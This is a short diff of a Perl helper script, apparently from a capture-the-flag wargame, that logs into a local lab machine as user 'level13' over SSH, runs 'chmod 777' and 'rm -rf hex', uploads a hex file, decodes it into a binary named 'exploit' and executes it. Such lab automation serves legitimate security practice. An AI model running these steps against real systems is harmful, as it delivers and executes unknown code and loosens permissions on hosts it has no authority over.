@@ -1,12 +1,21 @@
 #!/usr/bin/perl
 
-$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
-$user = "level13";
-
+$port = "22222";
+$ip = "localhost";
 $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
+$user = "level13";
 
-$scp = "scp -q -P 4242 $user\@$ip:~/level13 .";
-print $red, $scp, $reset, "\n";
+$chmod = "chmod 777 .";
+$ssh = "ssh -qp $port $user\@$ip '$chmod && rm -rf hex'";
+print $red, $chmod, $reset, "\n";
+system($ssh);
+
+$scp = "scp -q -P $port ./hex $user\@$ip:~";
+print $green, $scp, $reset, "\n";
 system($scp);
+
+$exploit = "xxd -r -p hex exploit && chmod 777 exploit && ./exploit";
+print $red, $exploit, $reset, "\n";
+system("ssh -qp $port $user\@$ip '$exploit'");
